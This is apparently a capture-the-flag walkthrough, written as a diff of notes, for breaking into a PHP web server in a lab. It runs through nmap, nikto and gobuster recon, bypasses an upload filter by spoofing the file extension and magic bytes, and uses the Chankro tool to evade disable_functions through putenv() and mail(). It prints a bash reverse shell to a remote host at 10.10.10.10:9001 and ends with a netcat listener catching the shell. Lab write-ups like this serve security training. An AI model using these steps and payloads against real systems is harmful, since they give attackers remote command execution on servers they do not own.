@@ -1,0 +1,112 @@
+among the applied measures of disabling dangerous functions that could execute operating system commands or start processes. Functions such as system() or shell_exec() are often disabled through PHP directives defined in 'php.ini' configuration file
+
+
+functions such as dl() [which allows user to load php extension dynamically] can go unnoticed by the system admin and not be disabled. the usual thing in an intrusion test is to list which functions are enabled in case any have been forgotten.
+
+
+One of the easiest technique to implement and not very widespread is to abuse the mail() and putenv() functionalities. 
+
+
+Chankro: tool to evade disable_functions and open_basedir
+
+Through chankro we can generate a php script that will act as a dropper, creating on the server a .so ibrary and the binary or bash script that we want to execute freely, and that will later call putenv() and mail() to launch the process
+
+Chankro: https://github.com/TarlogicSecurity/Chankro.git
+
+cmd: python chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html
+
+--arch = Architecture of system victim 32 o 64.
+--input = file with your payload to execute
+--output = Name of the PHP file you are going to create; this is the file you will need to upload.
+--path = It is necessary to specify the absolute path where our uploaded PHP file is located. For example, if our file is located in the uploads folder DOCUMENTROOT + uploads. 
+=====
+
+export IP=<IP>
+
+====
+
+Nmap scan
+
+nmap $IP -v -oN nmap.log -A
+
+
+=== nikto scan
+nikto -h $IP 
+
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.44.1
++ Target Hostname:    10.10.44.1
++ Target Port:        80
++ Start Time:         2024-10-27 15:21:31 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Server may leak inodes via ETags, header found with file /, inode: 2eec, size: 5c57cfb04877c, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
++ /phpinfo.php: Output from the phpinfo() function was found.
++ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ 8075 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2024-10-27 15:47:53 (GMT2) (1582 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+=== gobuster scan 
+gobuster dir -u http://$IP/ -w <directory-medium> -t 100
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/uploads              (Status: 301) [Size: 310] [--> http://10.10.44.1/uploads/]                                                                          
+/assets               (Status: 301) [Size: 309] [--> http://10.10.44.1/assets/]                                                                           
+/server-status        (Status: 403) [Size: 275]
+Progress: 220560 / 220561 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+=== open website at port 80 and apply for job
+upload php reverse shell 
+
+-> it failed
+
+-> says uplaod strict image, change the extension fo gif/png and respective magic file number and upload it
+
+-> its uploaded
+
+
+====
+now using chankro tool generate php shell
+tool link: https://github.com/TarlogicSecurity/Chankro
+
+create reverse shell in sh - use pentest monkey for it
+```
+#!/bin/bash
+sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
+```
+
+save it to shell.sh file
+
+from nikto scan we can see the system info with /phpinfo.php url path
+
+-> from there we can see one specific path in /var/www/html folder is exposed to outside networks, 
+
+-> use chankro tool to replace it (essentially)
+
+python3 chankro.py --arch 64 --input shell.sh --output shell.php --path /var/www/html/<fileName>
+
+-> now upload this shell.php file (make sure to update the extension and magic number to any image format using burpsuite or hxd
+
+-> now open netcat listener on port 9001 and listen to incoming connections and now in website go to uploads folder and select this shell.<extension>
+
+
+-> we have the reverse shell connection
+
+
+
